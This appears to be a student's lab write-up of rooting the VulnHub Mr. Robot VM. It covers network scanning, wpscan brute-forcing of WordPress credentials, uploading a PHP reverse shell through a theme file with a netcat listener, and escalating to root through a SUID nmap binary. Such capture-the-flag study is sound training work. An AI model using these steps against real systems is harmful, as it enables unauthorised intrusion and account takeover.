# 🧪 Hands-On Exploitation – Mr. Robot VM (Week 3 & 4)

This hands-on task focused on exploiting the vulnerable **Mr. Robot** VM from VulnHub using real-world techniques and achieving root access through privilege escalation.

---

## 🖥️ Target VM

* **Name:** Mr. Robot
* **Platform:** [VulnHub](https://www.vulnhub.com/entry/mr-robot-1,151/)
* **Goal:** Gain root access

---

## ⚙️ Environment Setup

* **Kali Linux** (Attacker machine)
* **Mr. Robot VM** (Target machine)
* **VirtualBox Network Mode:** NAT Network 

---

## 🔍 Step 1: Network Setup

* Identified Kali IP using:

  ```bash
  ifconfig
  ```
* Discovered target VM using:

  ```bash
  netdiscover -r 10.0.2.0/24
  ```

---

## 🕵️ Step 2: Reconnaissance

* Scanned the Mr. Robot VM for open ports:

  ```bash
  nmap -sV -A -T4 10.0.2.7
  ```

* Discovered:

  ```
  PORT    STATE  SERVICE    VERSION
  80/tcp  open   http       Apache httpd
  443/tcp open   https      Apache httpd
  ```

---

## 🌐 Step 3: Website Enumeration

* Visited: `http://10.0.2.7`

* Ran `dirb` to find hidden directories:

  ```bash
  dirb http://10.0.2.7
  ```

* Discovered `/robots.txt` → Found:

  * `/fsocity.dic` → Wordlist
  * `/key-1-of-3.txt` → First flag

---

## 💣 Step 4: WordPress Exploitation

* Enumerated users with:

  ```bash
  wpscan --url http://10.0.2.7 --enumerate u
  ```

* Brute-forced login using:

  ```bash
  wpscan --url http://10.0.2.7 --usernames elliot --passwords fsocity.dic
  ```

* Credentials Found:

  * **Username:** elliot
  * **Password:** ER28-0652

* Logged into WordPress and uploaded a **PHP reverse shell** via 404.php:

  ```bash
  cp /usr/share/webshells/php/php-reverse-shell.php shell.php
  ```

* Set up listener:

  ```bash
  nc -lvnp 4444
  ```

* Triggered shell via browser:

  ```
  http://10.0.2.7/wp-content/themes/twentyfifteen/shell.php
  ```

---

## 🚀 Step 5: Privilege Escalation

* Found SUID binary:

  ```bash
  find / -perm -4000 2>/dev/null
  ```

* Exploited vulnerable `nmap` binary:

  ```bash
  nmap --interactive
  !sh
  ```

* ✅ Got **root shell** successfully.

![Mr.Robot Exploit Screenshot](Images/mr.robot_exploit.png)

---

## 🧠 Learnings

* Practiced full exploitation chain: **Recon → Exploit → Shell → Root**
* Understood the role of **wordlists, SUID bits, and manual enumeration**
* Used tools: `nmap`, `wpscan`, `dirb`, `netdiscover`, and `reverse shells`

---
